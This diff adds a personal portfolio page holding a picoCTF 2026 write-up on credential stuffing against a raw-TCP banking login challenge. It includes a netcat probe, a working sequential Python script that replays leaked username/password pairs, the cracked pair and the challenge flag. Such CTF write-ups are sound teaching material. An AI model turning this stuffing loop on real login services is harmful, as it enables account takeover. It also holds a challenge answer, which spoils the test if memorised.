@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Credential Stuffing — Writeup — Dos Vathanak Botra</title>
+<meta name="description" content="Replaying a leaked username/password list against a raw-TCP banking login — and the debugging path to a reliable success test. A picoCTF web-exploitation writeup.">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=IBM+Plex+Mono:wght@300;400;500;600&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../css/base.css">
+<link rel="stylesheet" href="../../css/nav.css">
+<link rel="stylesheet" href="../../css/footer.css">
+<link rel="stylesheet" href="../../css/animations.css">
+<link rel="stylesheet" href="../../css/responsive.css">
+<link rel="stylesheet" href="../writeups.css">
+</head>
+<body>
+
+<div class="grid-bg"></div>
+<div class="scanlines"></div>
+
+<nav id="navbar">
+  <a href="../../index.html" class="nav-logo">DVB.SEC</a>
+  <ul class="nav-links" id="navLinks">
+    <li><a href="../../index.html#about">About</a></li>
+    <li><a href="../../index.html#skills">Skills</a></li>
+    <li><a href="../../index.html#experience">Experience</a></li>
+    <li><a href="../../index.html#certificates">Certs</a></li>
+    <li><a href="../index.html">Writeups</a></li>
+    <li><a href="../../index.html#contact">Contact</a></li>
+  </ul>
+  <div class="nav-right">
+    <button class="theme-toggle" id="themeToggle" onclick="toggleTheme()">
+      <span id="themeIcon">☀️</span> <span id="themeLabel">Light</span>
+    </button>
+    <div class="hamburger" id="hamburger" onclick="toggleMenu()">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</nav>
+
+<main class="wu-main">
+  <a href="../index.html" class="wu-back">← All writeups</a>
+
+  <div class="wu-report-head">
+    <span class="badge cat-web">Web Exploitation</span>
+    <span class="diff diff-medium">Medium</span>
+  </div>
+  <h1 class="wu-page-title">Credential Stuffing</h1>
+  <p class="wu-meta-line"><b>picoCTF 2026</b> · Web Exploitation · Medium</p>
+
+  <dl class="wu-glance reveal">
+    <div><dt>Technique</dt><dd>Credential stuffing (password reuse)</dd></div>
+    <div><dt>Target</dt><dd>Raw-TCP login, 1500 leaked pairs</dd></div>
+    <div><dt>Tools</dt><dd>Python sockets, netcat</dd></div>
+    <div><dt>Key lesson</dt><dd>Test success positively, not by absence</dd></div>
+  </dl>
+
+  <div class="wu-flag-wrap">
+    FLAG&nbsp; <span class="wu-flag" title="click to reveal" role="button" tabindex="0">academy{d0nt_r3u5e_cr3d3nt1als_9dee1556}</span>
+    <span class="wu-flag-hint">(click to reveal)</span>
+  </div>
+
+  <div class="wu-body">
+    <h2>Summary</h2>
+    <p>The challenge hands you 1500 leaked <code>username;password</code> pairs and one login — a raw-TCP “Online Banking Service” that prompts for a username then a password. Try every pair until one authenticates; the logged-in account prints the flag. Simple in theory — the interesting part was making the automation <em>reliable</em>.</p>
+    <div class="wu-insight"><p>The whole attack only works because people reuse passwords across sites. Credential stuffing is replaying one site's breach against another.</p></div>
+    <h2>Recon</h2>
+    <p>The dump is semicolon-separated, 1500 lines. The service is raw TCP (not HTTP): it prints <code>Username:</code> / <code>Password:</code>, and a failed attempt ends with <code>Invalid username or password</code>, then the server closes the connection — one attempt per connection.</p>
+    <div class="wu-code">
+      <div class="wu-code-head"><span>shell</span><button class="wu-copy">copy</button></div>
+<pre><code>printf '\n' | nc xebec.cylabacademy.net 44232
+# Welcome to the Online Banking Service!
+# Username: Password:</code></pre>
+    </div>
+    <h2>The debugging path</h2>
+    <p>My first two versions worked on the wrong assumptions. Fixing them is the real lesson:</p>
+    <ol>
+      <li><strong>False positive.</strong> v1 treated <em>“no ‘Invalid’ in the reply”</em> as success. Under parallel load, a <code>recv</code> timed out before the reply arrived → empty text → false hit (<code>riva:trent</code>, which a manual check disproved).</li>
+      <li><strong>Stall at exactly 300.</strong> With concurrent workers it froze at ~300 attempts every run. It looked like a rate limit — but timing 12 rapid <em>sequential</em> connections showed all were fast (~0.6s each). So it was a <strong>concurrency</strong> cap, not a per-attempt limit.</li>
+      <li><strong>Fix:</strong> go fully sequential, and read until the server closes the socket so every reply is complete before judging it.</li>
+    </ol>
+    <h2>The working stuffer</h2>
+    <div class="wu-code">
+      <div class="wu-code-head"><span>python</span><button class="wu-copy">copy</button></div>
+<pre><code>def one_try(u, p, timeout=12):
+    s = socket.socket(); s.settimeout(timeout); s.connect((HOST, PORT))
+    s.sendall((u + "\n" + p + "\n").encode())
+    data = b""
+    while True:
+        try: chunk = s.recv(4096)
+        except socket.timeout: break
+        if not chunk: break                 # server closed = complete reply
+        data += chunk
+        if b"Invalid username or password" in data: break
+    s.close(); return data.decode(errors="replace")
+
+for u, p in pairs:                           # one connection at a time
+    txt = one_try(u, p)
+    if "Invalid username or password" not in txt and "Password:" in txt:
+        print("HIT", u, p); break            # real, complete success reply</code></pre>
+    </div>
+    <h2>Result</h2>
+    <p>A few hundred pairs in, <code>ranna:phoenix</code> authenticated:</p>
+    <div class="wu-code">
+      <div class="wu-code-head"><span>text</span><button class="wu-copy">copy</button></div>
+<pre><code>Authenticating...
+Welcome ranna!
+academy{d0nt_r3u5e_cr3d3nt1als_9dee1556}</code></pre>
+    </div>
+    <h2>Takeaways</h2>
+    <ul>
+      <li><strong>Test success positively.</strong> “No error” isn't “success” — a timeout looks identical. Require a real success marker.</li>
+      <li><strong>Read until the server closes</strong> for one-shot TCP protocols, or you get truncated, ambiguous data.</li>
+      <li><strong>Diagnose before assuming.</strong> One timing test disproved the “rate limit” theory and pointed at the real concurrency cap.</li>
+      <li>The flag is the moral: <code>d0nt_r3u5e_cr3d3nt1als</code>.</li>
+    </ul>
+
+  </div>
+</main>
+
+<footer>
+  <div class="footer-name">DOS VATHANAK BOTRA</div>
+  <div class="footer-copy">© 2025 Dos Vathanak Botra. All rights reserved. · Phnom Penh, Cambodia</div>
+  <div class="footer-links">
+    <a href="../../index.html#hero">Home</a>
+    <a href="../index.html">Writeups</a>
+    <a href="../../index.html#contact">Contact</a>
+  </div>
+</footer>
+
+<script src="../../js/theme.js"></script>
+<script src="../../js/nav.js"></script>
+<script src="../../js/scroll.js"></script>
+<script src="../writeups.js"></script>
+</body>
+</html>
